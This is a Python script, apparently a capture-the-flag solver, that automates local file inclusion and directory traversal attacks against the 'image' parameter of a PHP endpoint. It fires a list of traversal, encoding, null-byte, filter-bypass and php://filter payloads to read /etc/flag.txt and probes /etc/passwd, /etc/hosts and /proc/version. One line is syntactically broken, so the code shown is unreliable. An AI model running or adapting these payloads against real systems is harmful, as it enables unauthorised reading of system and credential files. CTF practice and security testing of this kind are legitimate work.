#!/usr/bin/env python3
"""
Web Directory Traversal / LFI Challenge Solver
Automatically test various payloads to access /etc/flag.txt
"""

import requests
import urllib.parse

def test_lfi_payloads():
    print("🗂️  Web Directory Traversal Challenge Solver")
    print("=" * 60)
    
    base_url = "https://nm02.bootupctf.net:8082/picture.php"
    target_file = "/etc/flag.txt"
    
    # Common LFI payloads
    payloads = [
        # Basic directory traversal
        "../../../etc/flag.txt",
        "../../../../etc/flag.txt", 
        "../../../../../etc/flag.txt",
        "../../../../../../etc/flag.txt",
        "../../../../../../../etc/flag.txt",
        
        # Absolute path
        "/etc/flag.txt",
        
        # URL encoded
        "..%2f..%2f..%2fetc%2fflag.txt",
        "..%2f..%2f..%2f..%2fetc%2fflag.txt",
        
        # Double encoding
        "..%252f..%252f..%252fetc%252fflag.txt",
        
        # Null byte (PHP < 5.3.4)
        "../../../etc/flag.txt%00",
        "../../../etc/flag.txt%00.jpg",
        
        # Bypass filters
        "....//....//....//etc/flag.txt",
        "..\\..\\..\\etc\\flag.txt",
        
        # PHP wrappers
        "php://filter/read=convert.base64-encode/resource=../../../etc/flag.txt",
        "php://filter/convert.base64-encode/resource=/etc/flag.txt",
        
        # Different depths
        "etc/flag.txt",
        "./etc/flag.txt",
        "../../etc/flag.txt",
        "../etc/flag.txt",
        
        # With current directory
        "./../../../etc/flag.txt",
        
        # Mixed separators
        "..\\../..\\../etc/flag.txt",
    ]
    
    print(f"🔍 Testing {len(payloads)} LFI payloads...")
    print(f"Target: {target_file}")
    print("-" * 40)
    
    session = requests.Session()
    
    for i, payload in enumerate(payloads, 1):
        try:
            # Test the payload
            params = {'image': payload}
            response = session.get(base_url, params=params, timeout=10)
            
            print(f"{i:2d}. Testing: {payload}")
            print(f"    Status: {response.status_code}")
            
            # Check if we got the flag
            content = response.text.strip()
            
            if content and content != "Image not found." and "error" not in content.lower():
                print(f"    Content: {content[:100]}...")
                
                # Look for flag patterns
                if '{' in content and '}' in content:
                    print(f"\n🚩 POTENTIAL FLAG FOUND!")
                    print(f"    Payload: {payload}")
                    print(f"    Content: {content}")
                    return content, payload
                    
                elif "[REDACTED]")
                    return content, payload
                    
                elif len(content) > 10 and "not found" not in content.lower():
                    print(f"    ✅ Successful file read! Content: {content}")
                    return content, payload
            else:
                print(f"    Result: {content}")
                
        except Exception as e:
            print(f"    ❌ Error: {e}")
    
    print(f"\n❌ No successful LFI found with standard payloads")
    return None, None

def test_specific_file_access():
    """Test accessing other common files to confirm LFI works"""
    print(f"\n🔍 Testing access to common system files...")
    
    base_url = "https://nm02.bootupctf.net:8082/picture.php"
    test_files = [
        "../../../etc/passwd",
        "../../../../etc/passwd", 
        "../../../etc/hosts",
        "../../../proc/version",
        "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
    ]
    
    session = requests.Session()
    
    for test_file in test_files:
        try:
            params = {'image': test_file}
            response = session.get(base_url, params=params, timeout=10)
            content = response.text.strip()
            
            print(f"Testing: {test_file}")
            if content and content != "Image not found." and len(content) > 10:
                print(f"  ✅ Success! Content preview: {content[:100]}...")
                if "root:" in content:
                    print(f"  🎯 /etc/passwd accessed successfully!")
                    return True
            else:
                print(f"  ❌ Failed: {content}")
                
        except Exception as e:
            print(f"  ❌ Error: {e}")
    
    return False

def main():
    # Test LFI for flag
    flag, payload = test_lfi_payloads()
    
    if not flag:
        # Test if LFI works at all
        if test_specific_file_access():
            print(f"\n🤔 LFI appears to work, but flag not found at /etc/flag.txt")
            print(f"   The flag might be at a different location.")
        else:
            print(f"\n❌ LFI doesn't appear to work with standard payloads")
    else:
        print(f"\n🎉 Challenge Solved!")
        print(f"   Payload: {payload}")
        print(f"   Flag: {flag}")

if __name__ == "__main__":
    main()
